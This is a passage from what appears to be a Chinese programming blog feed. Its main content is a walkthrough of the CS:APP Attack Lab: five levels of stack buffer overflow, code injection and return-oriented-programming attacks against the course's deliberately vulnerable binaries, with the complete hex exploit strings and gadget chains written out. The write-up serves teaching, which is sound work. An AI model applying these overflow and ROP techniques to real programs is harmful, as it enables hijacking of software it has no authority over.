<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>查看cmake版本，检查是否安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CMake</category>
      </categories>
      <tags>
        <tag>CMake</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 缓冲区溢出实验</title>
    <url>/2020/08/02/2020-08-02-csapp-buflab/</url>
    <content><![CDATA[<h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
</li>
<li><p><code>gdb</code>和<code>objdump</code>使用</p>
</li>
<li><p>x86_64下的汇编</p>
</li>
</ul>
<span id="more"></span>

<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
<ul>
<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
</li>
<li><p><code>rtarget</code>：ROP攻击的程序。</p>
</li>
<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
</li>
<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
</li>
<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
</li>
</ul>
<p>实验共有5关，每一关的目标如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>

<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>

<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>构造攻击字符串, 写到文件<code>hex1</code></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>

<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>

<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
<ul>
<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
</li>
<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
</li>
<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
</li>
</ul>
<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>

<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>综上，得到我们需要输入的字符串</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image3.png"></p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
<ul>
<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
</li>
<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
</li>
<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
</li>
</ul>
<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>

<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>我第一次写这块汇编代码时，犯了两个错误：</p>
<ul>
<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
</li>
<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
</li>
</ul>
<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
<p>综上，得到我们需要输入字符串</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image4.png"></p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
<ul>
<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
</ul>
<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
<ul>
<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image6.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image7.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image8.png"><br><img src="/2020/08/02/2020-08-02-csapp-buflab/image9.png"></li>
</ul>
<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>

<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image10.png"></p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>

<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
<ul>
<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
</li>
<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
</li>
<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
</li>
<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
</li>
</ul>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h5 id="1-将-rsp传给-rdi"><a href="#1-将-rsp传给-rdi" class="headerlink" title="1. 将%rsp传给%rdi"></a>1. 将<code>%rsp</code>传给<code>%rdi</code></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
<h5 id="2-将偏移传给-rsi"><a href="#2-将偏移传给-rsi" class="headerlink" title="2. 将偏移传给$rsi"></a>2. 将偏移传给<code>$rsi</code></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>

<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
<h5 id="3-将cookie字符串传给-rdi"><a href="#3-将cookie字符串传给-rdi" class="headerlink" title="3. 将cookie字符串传给%rdi"></a>3. 将<code>cookie</code>字符串传给<code>%rdi</code></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
<h5 id="4-将-rax传给-rdi"><a href="#4-将-rax传给-rdi" class="headerlink" title="4. 将%rax传给$rdi"></a>4. 将<code>%rax</code>传给<code>$rdi</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
<p>输入的字符串如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img src="/2020/08/02/2020-08-02-csapp-buflab/image11.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>内核延时函数msleep和mdelay区别</title>
    <url>/2020/08/15/2020-08-15-difference-between-msleep-and-mdelay/</url>
